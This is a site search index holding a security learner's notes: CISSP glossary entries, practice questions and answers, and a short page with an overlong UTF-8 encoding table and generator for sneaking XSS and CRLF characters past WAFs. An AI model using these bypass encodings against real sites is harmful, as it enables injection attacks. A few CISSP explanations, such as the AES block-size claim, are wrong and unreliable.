{"config": {"lang": ["en"], "separator": "[\\s\\-]+", "pipeline": ["stopWordFilter"]}, "docs": [{"location": "", "title": "Welcome", "text": ""}, {"location": "#whoami", "title": "Whoami", "text": "<p>Hi, I\u2019m Ying. I have development experience in various languages and frameworks, including Java, Python, JavaScript, TypeScript, Vue.js and React.js. My background in software development, combined with experience in AWS cloud, database management, and source code review, enables me to perform security testing of complex applications effectively.</p> <ul> <li>Contact me (yingbai0315@gmail.com)</li> <li>My LinkedIn</li> </ul>"}, {"location": "#about-htb-machine-writeups", "title": "About HTB machine writeups", "text": "<ul> <li>Writeups for active machines are protected by passwords (Administrator's NTLM hash or root's hash)</li> <li>Writeups for retired machines don't have password</li> <li>I'm kind of lazy to upload all my writeups to this site, so ....</li> </ul> <p>Note: This site is created based on mkdocs. For full documentation visit mkdocs.org.</p>"}, {"location": "Bug%20Bounty/Overlong%20UTF-8%20encoding%20attack/", "title": "Overlong UTF-8 Encoding Attack", "text": "<p>For XSS, CRLF WAF bypass</p> <pre><code>%C0%8A / %E0%80%8A \u21d2 %0A\n%C0%8D / %E0%80%8D \u21d2 %0D\n%C0%BE / %E0%80%BE \u21d2 %3E (&gt;)\n%C0%BC / %E0%80%BC \u21d2 %3C (&lt;)\n%C0%A2 / %E0%80%A2 \u21d2 %22 (\")\n%C0%A7 / %E0%80%A7 \u21d2 %27 (')\n</code></pre> <pre><code>function toOverlongUTF8(hex){\n    const codePoint = parseInt(hex, 16);\n    let m = (b) =&gt; '%' + b.toString(16).toUpperCase();\n    if(codePoint &lt; 0x80){\n        let two_byte = [0xC0 | (codePoint &gt;&gt; 6), 0x80 | (codePoint &amp; 0x3F)]\n        let three_byte = [0xE0,0x80,0x80 | (codePoint &amp; 0x3F)]\n        return two_byte.map(m).join('') + ' / ' + three_byte.map(m).join('');\n    } else {\n        throw new Error(\"Only works for ASCII characters\");\n    }\n}\n\n// the output will be: %C0%A2 / %E0%80%A2\nconsole.log(toOverlongUTF8(\"22\"));\n</code></pre>"}, {"location": "CISSP%20Pre/Glossaries/", "title": "Glossaries", "text": "<p>TACACS+ uses Transmission Control Protocol (TCP) as Transport Layer Protocol. </p> <p>RADIUS uses UDP port 1812 or 1645 for authentication and port 1813 or 1646 for accounting. TACACS uses TCP port 49 to communicate between the client and server.</p> <p>ARP Poisoning (also known as ARP Spoofing) is a type of cyber attack carried out over a Local Area Network (LAN) that involves sending malicious ARP packets to a default gateway on a LAN in order to change the pairings in its IP to MAC address table. ARP Protocol translates IP addresses into MAC addresses.</p> <p>pivot: The act of an attacker moving from one compromised system to one or more other systems within the same or other organizations. Pivoting is fundamental to the success of advanced persistent threat (APT) attacks. SSH trust relationships may more readily allow an attacker to pivot.</p> <p>An ISFW (Internal Segmentation Firewall) enforces access control and firewall rules within the data center and also extends its protective reach across routers, VLANs, and subnets. By integrating ISFWs, businesses can enhance cybersecurity, reduce the attack surface, and align with a zero trust model.</p> <p>The Risk Management Framework (RMF) establishes mandatory requirements for federal agencies. </p> <p>The Cybersecurity Framework (CSF) is designed for critical infrastructure and commercial organizations. </p> <p>ISO 27001 establishes the guidelines for implementing an information security management system (ISMS) but is nation and industry agnostic. </p> <p>Center for Internet Security (CIS) provides OS, application, and hardware security configuration guides for a wide range of products.</p> <p>Digital rights management (DRM) methods attempt to provide copyright protection for copyrighted works. </p> <p>Data loss prevention (DLP) systems detect and prevent data from leaving a network. </p> <p>A cloud access security broker (CASB) is software placed logically between users and cloud-based resources to enforce security policies used in an internal network.</p> <p>A rainbow table attack is a password cracking method that uses a special table (a \u201crainbow table\u201d) to crack the password hashes in a database. Rainbow table attacks are less effective against modern password hashing practices. Two of the main ways to defend against it are MFA and Strong Passwords. Even with salting, strong passwords are essential. Enforce complex passwords with a mix of uppercase and lowercase letters, numbers, and symbols.</p> <p>A managed security service provider (MSSP) offers network security services to an organization. As a third party, an MSSP can alleviate the strain on IT teams, as well as free up crucial time the organization needs to support and expand operations.</p> <p>S-RPC (secure remote procedure call) is an authentication service and is simply a means to prevent unauthorized execution of code on remote systems.</p> <p>Software-defined network (SDN) is a unique approach to network operation, design, and management. SDN aims at separating the infrastructure layer (i.e., hardware and hardware-based settings) from the control layer (i.e., network services of data transmission management). Furthermore, this also removes the traditional networking concepts of IP addressing, subnets, routing, and so on from needing to be programmed into or be deciphered by hosted applications.</p> <p>East-west traffic is the traffic flow that occurs within a specific network, data center, or cloud environment. </p> <p>North-south traffic is the traffic flow that occurs inbound or outbound between internal systems and external systems. </p> <p>IEEE 802.1X provides port-based access control and is useful both on wired and wireless connections to block access to systems and users that are unknown or that fail authentication.</p> <p>NAT offers many benefits. NAT hides the internal IP addressing scheme and enables the sharing of a few public internet addresses with a large number of internal clients. NAT supports the use of the private IP addresses from RFC 1918 on an internal network. NAT does not protect against or prevent brute-force attacks.</p> <p>SOC (System and Organization Controls) 1engagements assess the organization\u2019s controls that might impact the accuracy of financial reporting. SOC 2 and 3 engagements extend into controls protecting confidentiality, integrity, and availability more generally. SOC 3 engagements assess the organization\u2019s controls that affect the security and privacy of information stored in a system. The results of a SOC 3 audit are intended for public disclosure.</p> <p>The Control Objectives for Information Technology (COBIT) are a framework for evaluating the controls organizations implement around information systems. The COBIT is a documented set of best IT security practices crafted by ISACA and the IT Governance Institute (ITGI)</p> <p>ATT&amp;CK and the Cyber Kill Chain are tools used to conduct threat intelligence. </p> <p>Accountability is maintained by monitoring the activities of subjects and objects as well as monitoring core system functions that maintain the operating environment and the security mechanisms. Authentication is required for effective monitoring, but it doesn\u2019t provide accountability by itself. Account lockout prevents login to an account if the wrong password is entered too many times. User entitlement reviews can identify excessive privileges.</p> <p>Security Orchestration, Automation, and Response (SOAR) technologies provide automated responses to common attacks, reducing an administrator\u2019s workload.</p> <p>OpenVAS (Open Vulnerability Assessment Scanner) is a network vulnerability scanning tool that searches systems for known vulnerabilities while minimizing damage caused during the assessment. </p> <p>The tool nmap is used to detect live systems and the status of ports; it is not considered a vulnerability scanner. </p> <p>Metasploit Framework is an exploitation framework that can cause damage to assessed systems. </p> <p>The Linux command lsof is used to \u201clist open files.\u201d</p> <p>IPsec is a security protocol that automatically performs reauthentication of the client system throughout the connected session in order to detect session hijacking. TLS, SSH, and LEAP do not include periodic midstream reauthentication.</p> <p>Civil investigations typically follow the \u201cpreponderance of the evidence\u201d standard.</p> <p>The Network Time Protocol (NTP) may be used to synchronize the clocks of all devices in an organization with a centralized source, improving the ability to correlate log entries from different sources.</p> <p>The scoping process removes controls from a list of controls from a suggested baseline.</p> <p>A playbook is a document or checklist that defines steps taken to validate an incident and steps taken in response to an incident. </p> <p>A runbook implements the checklists from a playbook.</p> <p>Service accounts are regular accounts that are used to run applications and services. They are not used to install or service applications, and administrators do not share them.</p> <p>A VLAN (virtual LAN) is a hardware-imposed network segmentation created by switches that requires a routing function to support communication between different segments. </p> <p>The COBIT key principles are: Provide Stakeholder Value, Holistic Approach, Dynamic Governance System, Governance Distinct From Management, Tailored to Enterprise Needs, and End-to-End Governance System.</p> <p>STRIDE stands for Spoofing, Tampering, Repudiation, Information disclosure, Denial of service and Elevation of privilege, developed by Loren Kohnfelder and Praerit Garg in 1999 to identify potential vulnerabilities and threats to company products.</p> <p>Software Assurance Maturity Model (SAMM) : </p> <p>There are six standard data type classifications used in either a government/military or a private sector organization in this list of options: public, private, sensitive, proprietary, critical, and confidential. </p> <p>Business Continuity Plan (BIA): 1. Identification of priorities; </p> <ol> <li> <p>Risk identification; </p> </li> <li> <p>Likelihood assessment; </p> </li> <li> <p>Resource prioritization.</p> </li> </ol> <p>Port security in IT field can refer to several concepts, including network access control (NAC), Transport layer ports, and RJ-45 jack ports. NAC requires authentication before devices can communicate on the network. Transport-layer port security involves using firewalls to grant or deny communications to TCP and UDP ports. RJ-45 jacks should be managed so that unused ports are disabled and that when a cable is disconnected, the port is disabled. This approach prevents the connection of unauthorized devices. Shipping container storage relates to shipping ports, which is a type of port that is not specifically related to IT or typically managed by a CISO.</p> <p>The Digital Signature Standard allows federal government use of the Digital Signature Algorithm, RSA, or the Elliptic Curve DSA in conjunction with the SHA-1 hashing function to produce secure digital signatures.</p> <p>SPAN ports (Switched Port Analyzer) and network taps are the most reliable mechanisms for gathering network traffic.</p> <p>Real evidence must be either uniquely identified by a witness or authenticated through a documented chain of custody.</p>"}, {"location": "CISSP%20Pre/Question%20review/", "title": "Question Review", "text": "<ol> <li> <p>Which one of the following cipher types operates on large pieces of a message rather than individual characters or bits of a message?</p> <p>Block cipher</p> </li> <li> <p>The University of Outer Mongolia runs a web application that processes student tuition payments via credit card and is subject to PCI DSS. The university does not wish to perform web vulnerability scans on a regular basis because they consider them too time-consuming. What technology may they put in place that eliminates the PCI DSS requirement for recurring web vulnerability scans?</p> <p>Web application firewall</p> <p>PCI DSS allows organizations to choose between performing annual web vulnerability assessment tests or installing a web application firewall.</p> </li> <li> <p>Your organization has recently decided to allow workers to telecommute from home. However, the CISO requires that the connections be protected by encryption using a standard VPN solution. Which of the following secure protocols can be used as a VPN? (Choose all that apply.)</p> <ul> <li>IPsec</li> <li>SSH</li> <li>TLS</li> </ul> <p>IPsec, SSH, and TLS are all able to be used as a VPN. While IPsec and TLS can be used as either transport mode or tunnel mode VPNs, SSH is limited to be used only as a transport mode VPN. The others are not VPN protocols. Kerberos offers a single sign-on solution for users and provides protection for logon credentials. Modern implementations of Kerberos use hybrid encryption to provide reliable authentication protection. Signal is a cryptographic protocol that provides end-to-end encryption for voice communications, videoconferencing, and text message services. S-RPC (Secure Remote Procedure Call) is an authentication service and is simply a means to prevent unauthorized execution of code on remote systems.</p> </li> <li> <p>Administrators regularly back up sensitive data on servers within a data center. Security controls restrict access to the data center, and all systems that process sensitive information are marked. After backing up data, they send an unmarked copy to an unstaffed company warehouse for long-term storage. Recently, someone posted some of this data on the internet. Investigators determined much of the backup media is no longer in the warehouse. Which of the following administrator actions would have the best chance of preventing this incident?</p> <p>Mark the tapes before sending them to the warehouse.</p> <p>If the tapes were marked before they left the data center, employees would recognize their value, and it is more likely someone would challenge their storage in an unstaffed warehouse. Purging or degaussing the tapes before using them will erase previously held data but won\u2019t help if sensitive information is backed up to the tapes after they are purged or degaussed. Adding the tapes to an asset management database will help track them but wouldn\u2019t prevent this incident.</p> </li> <li> <p>Which of the following VPN protocols has always offered native data encryption?</p> <p>IPsec</p> <p>From this list of VPN protocols, only IPsec has always offered native data encryption. Generic Routing Encapsulation (GRE) is a proprietary Cisco tunneling protocol that can be used to establish VPNs. GRE provides encapsulation but not encryption. L2TP does not offer native data encryption, but it can support IPsec\u2019s ESP to provide encryption. PPTP did not originally provide native data encryption, but with the adoption of MS-CHAPv2 that feature was added.</p> </li> <li> <p>A risk assessment includes the evaluation of threats for each identified asset. What are the potential areas of concern related to third-party connectivity? (Choose all that apply.)</p> <ul> <li>Business partnerships</li> <li>Cloud services</li> <li>Telecommuting</li> </ul> <p>The potential areas of concern related to third-party connectivity are those in which an actual outsider is to be directly connected to on-premises networks; these situations include business partnerships, cloud services, and telecommuting. Third-party connectivity is not involved when using VPN links to connect business branches.</p> </li> <li> <p>Don\u2019s organization is having a difficult time tracking different versions of software being worked on by different developers. What type of tool would best assist with this problem?</p> <p>Code repository</p> <p>The use of a code repository would provide a central location for the storage of code as well as version control to manage different releases. Integrated development environments (IDE) are tools used to improve the efficiency of individual programmers and do not assist with collaboration. Integrated product teams (IPTs) are a team organizational approach and not a development tool. Runtimes execute code on a system and are not development tools.</p> </li> <li> <p>What law protects the right of citizens to privacy by placing restrictions on the authority granted to government agencies to search private residences and facilities?</p> <p>Fourth Amendment</p> <p>The Fourth Amendment to the U.S. Constitution sets the \u201cprobable cause\u201d standard that law enforcement officers must follow when conducting searches and/or seizures of private property. It also states that those officers must obtain a warrant before gaining involuntary access to such property. The Privacy Act regulates what information government agencies may collect and maintain about individuals. The Second Amendment grants the right to keep and bear arms. The Gramm\u2013Leach\u2013Bliley Act regulates financial institutions, not the federal government.</p> </li> <li> <p>In today\u2019s business environment, prudence is mandatory. Showing due diligence and due care is the only way to disprove negligence in an occurrence of loss. Which of the following are true statements? (Choose all that apply.)</p> <ul> <li>Due diligence is establishing a plan, policy, and process to protect the interests of an organization.</li> <li>Due care is practicing the individual activities that maintain the security effort.</li> </ul> <p>Due diligence is establishing a plan, policy, and process to protect the interests of an organization. Due care is practicing the individual activities that maintain the security effort. The other options are incorrect, they have the terms inverted. The corrected statements are as follows: Due diligence is developing a formalized security structure containing a security policy, standards, baselines, guidelines, and procedures. Due care is the continued application of a security structure onto the IT infrastructure of an organization. Due diligence is knowing what should be done and planning for it. Due care is doing the right action at the right time.</p> </li> <li> <p>An organization wants to improve the security of their DNS operations by implementing DNSSEC. Which of the following is most important to support this new security mechanism?</p> <p>PKI </p> <p>DNSSEC uses certificates to perform mutual authentication between DNS servers, and thus public key infrastructure (PKI) is needed to provide and support those certificates. HTTPS is not involved in DNSSEC but is the basis for DoH. A hardware security module (HSM) is not used in DNSSEC. LDAPS is not related to DNSSEC.</p> </li> <li> <p>An administrator has been tasked with reviewing the Human Resources server log files looking for malicious activity. Which of the following identifies the purpose of this activity?</p> <p>Accountability</p> <p>Accountability is possible by reviewing logs and tracking user activity. Accountability depends on strong identification and authentication methods, but reviewing logs doesn\u2019t provide identification or authentication. Audit trails are the entire body of data gathered by event logging.</p> </li> <li> <p>Third-party governance is the system of external entity oversight that may be mandated by law, regulation, industry standards, contractual obligation, or licensing requirements. Often third-party assessment is necessary to evaluate the security of a supply chain. Which of the following means of third-party assessment is used to interview personnel and observe their operating habits?</p> <p>On-site assessment</p> <p>An on-site assessment is a third-party assessment tool where auditors visit the site of the organization to interview personnel and observe their operating habits. Document exchange and review is a mechanism to investigate the means by which datasets and documentation are exchanged as well as the formal processes by which they perform assessments and reviews. Process/policy review is a mechanism that requests copies of their security policies, processes/procedures, and documentation of incidents and responses for review. A third-party audit is performed by a third party, such as defined by AICPA (the American Institute of Certified Public Accountants), to provide an unbiased review of an entity\u2019s security infrastructure.</p> </li> <li> <p>No one control can protect against all possible threats. Using a multilayered solution allows for numerous, different controls to guard against whatever threats come to pass. Which of the following is the most important and distinctive concept in relation to layered security?</p> <p>Series</p> <p>Layering is the deployment of multiple security mechanisms in a series. When security restrictions are performed in a series, they are performed one after the other in a linear fashion. Therefore, a single failure of a security control does not render the entire solution ineffective. Multiple security controls are only important so you can use them in a series, rather than have only one protection. Parallel is no better than a single protection. Filtering is a common feature of many security measures, such as firewalls, but it is not an essential element of layered security.</p> </li> <li> <p>Your organization has a strictly enforced email security policy which prohibits messages lacking proof of source and lacking non-repudiation. However, you have received a message which fails to meet these requirements and notice several other concerning characteristics. Which of the following are indicators that this message is a hoax? (Select three.)</p> <p>A. Lack of a digital signature verifying the origin</p> <p>D. Threat of damage to your computer system</p> <p>E. Encouragement to take specific steps to resolve a concern which are not based on standard company procedures</p> <p>A hoax is a social engineering attack that is attempting to trick a user into taking actions that will harm them through the use of fear that not taking action would actually cause harm. A hoax will not have a digital signature from a verifiable origin, so its source is questionable. Hoaxes often use the threat of damage or harm to encourage the victim to take action, and those actions are often provided steps that will actually cause the victim harm. (B) Poor grammar, (C) bad spelling, and (G) hyperlinks in the message are all characteristics of both valid and invalid email messages. (F) Claiming to be from a trusted authority is the attempt to use the social engineering principle of authority and/or intimidation, which is not uniquely a feature of a hoax, but many SPAM, BEC, phishing attacks do as well. But the claim of being a trusted authority could also be valid as well.</p> </li> <li> <p>The CISO has put you in charge of improving the security awareness and training program. The concern they want you to focus on is that it is unknown whether the training efforts are having any affect or benefit. If you cannot establish proof of a positive ROSI, then the program will be terminated. Which of the following would be useful in establishing an effectiveness evaluation procedure? (Choose all that apply.)</p> <p>B. Administering a quiz immediately after the awareness event</p> <p>D. Have workers take a test 6 months after a training class</p> <p>E. Collect key security indicators that relate to insider security incidents over time</p> <p>Training and awareness program effectiveness evaluation should take place on an ongoing or continuous basis. This can often include administering a quiz or exam immediately after an awareness or training event and a follow-up quiz/exam months later. Also, event and incident logs should be reviewed for the rate of occurrences of security violations due to employee actions and behaviors to see if there is any noticeable difference in the rate of occurrence or trends of incidents before and after a training presentation. The other options are not useful for training program effectiveness evaluation. (A) Never assume that just because a worker was marked as attending or completing a training event that they actually learned anything or will be changing their behavior. (C) Forcing employees to pay a fine for each security infraction is not a means to assess effectiveness; it is a crude means to force compliance. (F) Posting a list of employees who cause a security incident is not a means to assess effectiveness; it is a mechanism of using shame to force compliance and it is not an ethical practice.</p> </li> <li> <p>Patricia recently discovered that passwords to systems and user accounts belonging to her organization were for sale on the dark web. She believes that she knows the individual who stole and is selling those passwords and wishes to contact law enforcement. What law has most likely been violated?</p> <p>Computer Fraud and Abuse Act</p> <p>The Computer Fraud and Abuse Act (CFAA) explicitly covers trafficking in passwords. This is the activity that Patricia discovered and she could refer the matter for possible federal prosecution. The Electronic Communications Privacy Act (ECPA) protects against eavesdropping on electronic communications. The Federal Sentencing Guidelines are not law and do not contain privacy protection provisions. The National Infrastructure Protection Act would only apply if the system were part of a critical infrastructure system. That is not indicated in the scenario.</p> </li> <li> <p>What U.S. federal law prohibits attempts to circumvent copyright protection mechanisms placed on a protected work by the copyright holder?</p> <p>Digital Millennium Copyright Act</p> <p>The Digital Millennium Copyright Act contains provisions prohibiting the circumvention of copyright protection mechanisms. The Trade Secrets Act applies to trade secrets, not copyrights. The USA PATRIOT Act enhances government surveillance capabilities. The Copyright Enhancement Act does not exist as a U.S. federal law.</p> </li> <li> <p>Barry is the privacy officer for a college that accepts federal funds. He is reviewing the security of student educational records and want to ensure that his college is compliant with all relevant laws and regulations. What law protects the privacy rights of students?</p> <p>FERPA</p> <p>The Family Educational Rights and Privacy Act (FERPA) protects the rights of students and the parents of minor students. The Gramm\u2013Leach\u2013Bliley Act (GLBA) covers the customer records of financial institutions, whereas the Health Insurance Portability and Accountability Act (HIPAA) regulates healthcare providers. The Sarbanes\u2013Oxley (SOX) Act governs the financial records of publicly traded companies.</p> </li> <li> <p>An organization plans to donate several older computers to a local school. Chad will sanitize the hard drives in these computers. Which of the following methods is Chad most likely to use?</p> <p>Purging</p> <p>Purging media removes all data by writing over existing data multiple times to ensure that the data is not recoverable using any known methods. Purged media can then be reused in less secure environments. Erasing the media performs a delete, but the data remains and can easily be restored. Clearing, or overwriting, writes unclassified data over existing data, but some sophisticated forensics techniques may be able to recover the original data, so this method should not be used to reduce the classification of media.</p> </li> <li> <p>A small business is planning to outsource payroll. This requires the business to pass some data to the payroll company to handle payroll functions. In this scenario, which of the following roles best describes the payroll company?</p> <p>Data processor</p> <p>The payroll company is fulfilling the role of data processor by processing the payroll data. The data controller identifies what data to pass to the data processor and how that data should be processed. A data subject is like a data user and simply accesses data. A data custodian is responsible for the day-to-day maintenance of data.</p> </li> <li> <p>You need to identify a method to embed unobtrusive labels in digital data. After they are embedded, other methods should be able to detect these labels. Which of the following is the best choice to meet these requirements?</p> <p>Watermarking</p> <p>Digital watermarking places labels or marking in files (digital data). Other methods, such as data loss prevention (DLP) and digital rights management (DRM), can detect the labels. Remanence refers to data left on media after it should have been removed. A digital signature is used in emails to validate the sender\u2019s identity. Encryption scrambles data so that it is unreadable, but it doesn\u2019t add labels.</p> </li> <li> <p>An organization is decommissioning several older computers and replacing them with new ones. The CIO wants to ensure that data remanence is not a problem with the disk drives within these computers. Which of the following methods will most likely result in data remanence?</p> <p>Erasing</p> <p>Erasing data on a hard disk drive is likely to leave some data on a hard disk drive, also known as data remanence. Clearing (sometimes called overwriting) overwrites the disk drive with different bits in three separate passes. Purging is a more intense method of clearing the disk and repeats the clearing process multiple times. Cryptoshredding deletes encryption keys, but the question doesn\u2019t indicate data is encrypted.</p> </li> <li> <p>Your company is planning to launch an e-commerce website. Management wants to ensure this website has adequate security controls in place before the site goes live. Administrators started with a baseline of security controls. What else should be a primary consideration related to security controls?</p> <p>Selecting a standard</p> <p>Standards selection refers to adding security controls based on external standards. The Payment Card Industry Data Security Standard (PCI DSS) is an example of an external standard, and it mandates the use of several specific controls. The identification of the data controller and data processor isn\u2019t related to the selection of security controls. Data loss prevention methods attempt to prevent data from leaving a network but are less of a concern on a public-facing e-commerce server.</p> </li> <li> <p>Your organization has a database that includes residents of the EU. Management wants to transfer this to a third party for research and aggregation, but they want to modify the data so it can be transferred without GDPR compliance problems. Which of the following techniques will meet these requirements?</p> <p>Anonymization</p> <p>Anonymization techniques remove all data so that it is difficult to identify the original identities. When done correctly, the GDPR no longer applies. Pseudonymization is the process of replacing some data with an identifier, such as a pseudonym. An external dataset holds the original data along with the pseudonym. However, if applying pseudonymization techniques, the GDPR still applies. Tokenization replaces some data with tokens or aliases. A third party typically keeps the original data along with the token.</p> </li> <li> <p>What is the maximum key length supported by the Advanced Encryption Standard\u2019s Rijndael encryption algorithm?</p> <p>256 bits</p> <p>The AES/Rijndael algorithm is capable of operating with 128-, 192-, or 256-bit keys. The algorithm uses a block size equal to the length of the key.</p> </li> <li> <p>What protocol replaces certificate revocation lists with a real-time method of verifying the status of a digital certificate?</p> <p>OCSP</p> <p>The Online Certificate Status Protocol (OCSP) provides real-time query/response services to digital certificate users. This overcomes the latency inherent in the traditional certificate revocation list download and cross-check process. Simultaneous Authentication of Equals (SAE) is an authentication protocol used in WPA3 wireless networking. The Lightweight Directory Access Protocol (LDAP) is a directory services protocol. The Border Gateway Protocol (BGP) is used to establish network routes.</p> </li> <li> <p>You are deploying a new product into the production environment. It is a self-contained next-generation firewall (NGFW), which should be able to filter unwanted traffic by keyword, application, and protocol. You position the new device between the client network segment and the server network segment. However, once it is installed, users report that they can no longer access company servers or the internet. What is the potential cause of this issue?</p> <p>The new device has secure defaults.</p> <p>This scenario\u2019s problems are caused by the new device having secure defaults. This is a common problem with security products\u2014they are often configured with strong security defaults so that adjustments must be made to allow for typical communications and operations.</p> </li> <li> <p>Security needs to be designed, architectured, engineered, integrated, and implemented in order to be reliable and cost-effective. There are numerous security design principles that can be adopted and woven into the crafting of company policies as well as deployed solutions. Which of the following are considered secure design principles? (Choose all that apply.)</p> <p>B. Least privilege</p> <p>C. Secure defaults</p> <p>D. Fail securely</p> <p>F. Threat modeling</p> <p>G. Keep it simple</p> <p>I. Separation of duties</p> <p>J. Zero trust</p> <p>K. Privacy by design</p> <p>The standard secure design principles are: least privilege, secure defaults, fail securely, threat modeling, keep it simple, separation of duties, zero trust, and privacy by design. The not listed but also secure design principles are defense in depth and trust but verify. The other options are incorrect. \u201cPeople are the weakest link\u201d is not a secure design principle and is also not accurate. Although people can cause security breaches intentionally, accidentally, or via coercion, they are also a key component in a successful security solution. \u201cSecurity is always top priority\u201d is not a secure design principle. Security should always be limited by business objectives. The most secure solution may interfere with a mission-critical business function, so security must support the business rather than get in the way of it. \u201cRisk should be eliminated\u201d is not a secure design principle and is false. All risk cannot be eliminated. There may be some individual risks that can be eliminated, but in most circumstances risk reduction, management (i.e., deterrence, transfer, avoidance), or acceptance are the only real options.</p> </li> <li> <p>An industrial processing facility has implemented SCADA systems to monitor and manage the mission-critical production lines. These ICSs cannot adhere to the company\u2019s 14-day patch application policy. How can these systems be secured in order to minimize malware infection?</p> <p>Prohibit nonauthorized nonessential software from executing</p> <p>In this scenario, the best option is to prohibit nonauthorized nonessential software from executing. A software firewall might limit network communication sessions, but will not necessarily reduce the risk of malware traversing a network link. Deployment in a screened subnet is not a good option as it may expose the ICS to the internet; deployment in a private network segment or an air-gapped network would be a better option. An IDS would only notify about a breach or intrusion or malware infection after it occurred, but an IPS might be a reasonable option.</p> </li> <li> <p>Your organization has decided to update their IT environment to take advantage of advancements in virtualization solutions. They are primarily focused on containerization products. Which of the following are features or capabilities of some containerization solutions? (Choose all that apply.)</p> <p>B. Allow for multiple concurrent applications within a single container</p> <p>D. Offer customization of interaction between applications in separate containers</p> <p>Containerization or OS virtualization is based on the concept of eliminating the duplication of OS elements in a virtual machine. Some containerization solutions allow for multiple concurrent applications withing a single container, whereas others are limited to one per container. Many containerization solutions allow for customization of how much interaction applications in separate containers is allowed. The other options are incorrect. A virtual machine\u2013based system uses a hypervisor installed onto the bare metal of the host server and then operates a full guest OS within each virtual machine, and each virtual machine often supports only a single primary application. Software-defined visibility (SDV) is a framework to automate the processes of network monitoring and response.</p> </li> <li> <p>Which of the following is typically not a culprit in causing damage to computer equipment in the event of a fire and a triggered suppression?</p> <p>Light</p> <p>Light is usually not damaging to most computer equipment, but fire, smoke, and the suppression medium (typically water) are very destructive.</p> </li> <li> <p>Your facility has just been upgraded with a new burglar alarm system. This intrusion monitoring mechanism is able to detect both perimeter breaches as well as internal movement. Which of the following is not a typical type of alarm that can be triggered for physical security?</p> <p>A. Preventive</p> <p>There is no such thing as a preventive alarm. Alarms are triggered in response to a detected intrusion or attack. Whenever a motion detector registers a significant or meaningful change in the environment, it triggers an alarm. Common types of alarms include deterrent, repellent, and notification.</p> </li> <li> <p>Your organization is considering an upgrade of the internal network to support IPv6. You have been asked to provide an evaluation of the benefits and drawbacks of this project. Which of the following are true in regard to IPv6? (Choose all that apply.)</p> <p>B. Uses 16-byte addresses</p> <p>D. Supports autoconfiguration without DHCP</p> <p>F. Supports Quality of Service (QoS) priority values</p> <p>IPv6 uses 16-byte (128-bit) addresses, supports autoconfiguration without DHCP, and supports Quality of Service (QoS) priority values. IPv4 uses 32-bit addresses, reserves an entire subnet (127.0.0.1\u2013127.255.255.254) for loopback, and requires NAT to convert between internal and external addresses. IPv4 also supports QoS priority values, but it is called \u201ctype of service\u201d in the IPv4 header.</p> </li> <li> <p>Xavier has been tasked with redesigning the network in order to minimize the risk related to users in one department accessing the systems in another. Which of the following is not used to segment a network?</p> <p>VPN</p> <p>A VPN is not a network segmentation; it is a secured encapsulation tunnel used to connect networks (or network segments) together. Screened subnets, VLANs, and an internal segmentation firewalls (ISFW) are used to segment a network.</p> </li> <li> <p>Which of the following are technologies specifically defined as part of 802.11 wireless networking? (Choose all that apply.)</p> <p>B. WPA3</p> <p>C. SAE</p> <p>D. 802.11i</p> <p>E. WPS</p> <p>WPA3, 802.11i, SAE (Simultaneous Authentication of Equals), and WPS are all technologies that are specifically defined as part of wireless networking. 802.1X is an IEEE standard for port authentication, which is not strictly related to wireless use. It is, however, the basis of the ENT (enterprise) authentication option on wireless networks, but it is widely used to manage authentication throughout a wired network as well.</p> </li> <li> <p>A worker reports that they are unable to access an internal web application from their workstation. After you confirm that the worker has been assigned correct authorization, you review the logs from the workstation for clues. You discover the following entries:</p> <p><code>2020-01-08 12:15:36 DROP TCP 192.168.6.104 192.168.255.255 443 ---------- RECEIVE</code></p> <p><code>2020-01-08 12:15:51 DROP UDP 192.168.6.104 192.168.255.255 443 ---------- RECEIVE</code></p> <p>Based on this information, which of the following should you adjust to address this situation?</p> <p>Host-based firewall</p> <p>These log items are from a firewall log. They indicate that TCP and UDP traffic from the 192.168.x.x subnet to the workstation was dropped. Since this log is from the workstation, this indicates that there is a bad rule in the host-based firewall that is blocking all communications to the workstation from the local subnet. </p> </li> <li> <p>While performing a risk assessment, you need to create a list of threats. You are focusing on email as an asset, but you then realize email can be used as a weapon as well. What is it called when email itself is used as an attack mechanism?</p> <p>Mail-bombing</p> <p>Mail-bombing is the use of email as an attack mechanism by flooding a system with messages, causing a denial of service. Masquerading is claiming to be someone or something else and is a form of spoofing. Spoofing is the falsification of the source of a communication, such as spoofing an IP address, email address, or MAC address. A Smurf attack is an ICMP-based DoS.</p> </li> <li> <p>Remi is evaluating several multimedia collaboration products for use in her company. She needs to determine which products provide the best solution for her organization\u2019s business objectives. The product will be used in-house as well as by remote workers using broadband internet services. Which of the following questions should she ask when evaluating each option? (Choose all that apply.)</p> <p>A. Does the communication occur across an open protocol or an encrypted tunnel?</p> <p>C. Does the service use strong authentication techniques?</p> <p>D. Are activities of users audited and logged?</p> <p>E. What tracking mechanisms are used, can the tracking be disabled, and what is the data collected for?</p> <p>Questions about minimum bandwidth requirements for chat and voice are likely unneeded since those services do not require much bandwidth and the remote users are all working over broadband internet services.</p> </li> <li> <p>Telecommuting is performing work at a remote location. Telecommuting clients use many remote access techniques to establish connectivity to the central office LAN. Which of the following are examples of a remote access techniques? (Choose all that apply.)</p> <p>A. Remote node operation</p> <p>C. Remote control</p> <p>E. Screen scraping</p> <p>F. Service specific</p> </li> <li> <p>A software company with a worldwide footprint recently bought out another software company based in the United States. The U.S. company needs to maintain its name and domain infrastructure. However, employees in both companies need to access resources in the other network. Which of the following would best meet this need?</p> <p>A federation</p> <p>A federation can include two or more networks and allow users in each network to share network resources. Federations provide single sign-on (SSO) capabilities, but SSO will not share network resources.</p> </li> <li> <p>A company\u2019s security policy states that user accounts should be disabled during the exit interview for any employee leaving the company. Which of the following is the most likely reason for this policy?</p> <p>To retain the decryption key</p> <p>The most likely reason (of the provided answers) is the retention of the account\u2019s decryption key. Data encrypted by a user is typically encrypted with a key tied to the user account, and deleting the account may result in the data staying encrypted and unavailable. Though not available as an option, disabling the account also prevents an employee from logging on after leaving the company. Disabling the account allows supervisors to review the user\u2019s data. Employees should return company property, but disabling an account won\u2019t ensure they do so. Disabling a user account won\u2019t terminate employee benefits.</p> </li> <li> <p>Network-based intrusion detection systems (NIDSs) and network-based intrusion prevention systems (NIPSs) have some differences and some similarities. Which of the following describes a similarity?</p> <p>They can both detect attacks using pattern-matching</p> <p>NIDSs and NIPSs can both detect attacks using pattern-matching (also known as signature-based detection and knowledge-based detection). A NIPS is placed inline with traffic and can prevent attacks from reaching an internal network. While a NIDS can be placed inline with the traffic, it isn\u2019t placed inline by default. An IDS may be connected to a network switch port using mirror mode to collect data, but an NIPS would be inline with all traffic.</p> </li> <li> <p>Tina is preparing to create a forensic image of a hard drive from a system involved in a security incident. What hardware device can she use to help ensure that creating the image does not alter the original evidence?</p> 